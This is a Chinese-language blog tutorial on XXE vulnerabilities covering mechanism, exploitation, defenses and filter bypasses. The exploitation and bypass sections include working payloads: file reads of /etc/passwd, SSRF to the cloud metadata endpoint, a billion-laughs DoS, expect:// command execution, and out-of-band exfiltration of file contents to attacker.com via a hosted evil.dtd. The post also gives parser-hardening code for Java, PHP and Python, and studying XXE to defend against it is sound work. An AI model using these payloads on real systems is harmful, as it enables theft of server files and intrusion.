enus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XXE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-20T02:16:10.000Z" title="发表于 2025-03-20 10:16:10">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-23T12:59:30.305Z" title="更新于 2025-04-23 20:59:30">2025-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><strong>漏洞原理：</strong></p>
<p>利用XML解析器的<strong>外部实体加载功能</strong>实现攻击的漏洞。攻击者通过构造恶意XML数据，使服务器解析时加载外部资源（如本地文件、远程URL），导致敏感信息泄露、SSRF攻击甚至远程代码执行。</p>
<p><strong>核心机制：</strong></p>
<ul>
<li><p>XML实体定义：XML允许通过<code>&lt;!ENTITY&gt;</code>定义实体，实体可应用内部值或外部资源</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>解析器特性：未安全配置的XML解析器（如DOM、SAX）默认加载外部实体，攻击者通过注入恶意实体触发非预期行为</p>
</li>
</ul>
<p><strong>触发条件：</strong></p>
<ul>
<li>应用程序接受并解析用户可控的XML数据（如API请求、文件上传）</li>
<li>XML解析器启用外部实体解析且未过滤危险协议（如<code>file://</code>、<code>http://</code>）</li>
</ul>
<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><p><strong>攻击方式：</strong></p>
<ul>
<li><p>读取本地文件：通过<code>file://</code>协议读取服务器文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>发起SSRF攻击：利用<code>http://</code>协议探测内网服务或元数据接口</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
</li>
<li><p>拒绝服务（Dos）：通过递归实体应用触发解析器崩溃</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>远程代码执行（需特定环境）：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>盲注XXE（Blind XXE）</strong></p>
<p>当响应不直接返回数据时，通过外带通道（OOB）泄露信息</p>
<ul>
<li><p>利用DNS查询：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/?data=%file;&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
</li>
<li><p>构造外部DTD文件：攻击者托管恶意DTD文件，触发服务器解析并回传数据</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 恶意DTD（evil.dtd） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">exfil</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>

<p>目标XML载荷：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><p><strong>禁用外部实体：</strong></p>
<ul>
<li><p>java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>python：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>使用安全解析器：</strong></p>
<ul>
<li>优先选择禁用DTD和外部实体的库（如OWASP推荐的<code>XMLSec</code>）。</li>
</ul>
<p><strong>输入过滤与白名单：</strong></p>
<ul>
<li>过滤用户输入的<code>&lt;!DOCTYPE&gt;</code>、<code>&lt;!ENTITY&gt;</code> 等关键字。</li>
<li>校验XML结构是否符合预期模式（如XSD）</li>
</ul>
<p><strong>限制协议与访问范围：</strong></p>
<ul>
<li>禁用危险协议（<code>file://</code>、<code>http://</code>），仅允许必要协议（如<code>https://</code>）。</li>
<li>配置防火墙规则，阻止服务器向内部网络或元数据接口发起请求</li>
</ul>
<p><strong>使用JSON代替XML：</strong></p>
<ul>
<li>若非必须，避免使用XML格式，改用JSON等更安全的数据格式。</li>
</ul>
<h1 id="XXE绕过"><a href="#XXE绕过" class="headerlink" title="XXE绕过"></a>XXE绕过</h1><p><strong>协议处理差异：</strong></p>
<ul>
<li>利用支持的协议：不同解析器支持的协议可能不同（如PHP的<code>php://filter</code>、java的<code>jar://</code>）<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>编码与混淆：</strong></p>
<ul>
<li><p>十六进制&#x2F;UTF-8编码：绕过关键字过滤</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;ht&quot;</span> <span class="string">&quot;tp://attacker.com&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 拆分字符串 --&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>CDATA块包裹：隐藏恶意内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]]&gt;  </span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>利用未禁用参数实体：</strong></p>
<ul>
<li>若仅禁用外部通用实体，但允许参数实体：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">param_entity</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %param_entity;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>XInclude攻击：</strong></p>
<ul>
<li>当XML解析器支持XInclude且禁用DTD时：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>文件上传结合XXE：</strong></p>
<ul>
<li>上传SVG、DOCX等包含XML的文档，触发解析漏洞。</li>
</ul>
